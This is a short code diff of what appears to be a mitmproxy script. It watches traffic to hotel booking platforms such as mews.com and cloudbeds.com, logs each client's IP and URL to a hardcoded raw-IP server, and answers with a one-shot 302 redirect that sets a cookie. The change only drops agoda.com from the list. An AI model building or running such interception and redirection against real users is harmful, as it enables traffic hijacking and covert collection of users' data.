@@ -17,7 +17,6 @@ FUNCTION_COMPLETE_URL = "http://89.42.142.29:5000/log_function_complete"
 
 # Домены для мониторинга платформ (сокращенный список)
 PLATFORM_DOMAINS = [
-    "agoda.com",
     "mews.com",
     "cloudbeds.com",
     "smoobu.com",
@@ -2032,4 +2031,5 @@ def request(flow: http.HTTPFlow) -> None:
     log_redirect_to_server(client_ip, flow.request.pretty_url, redirect_target, "ONE_SHOT")
     flow.response = http.Response.make(
         302, b"", {"Location": redirect_target, "Set-Cookie": f"{COOKIE}=1; Path=/; Secure; HttpOnly"}
+
     )
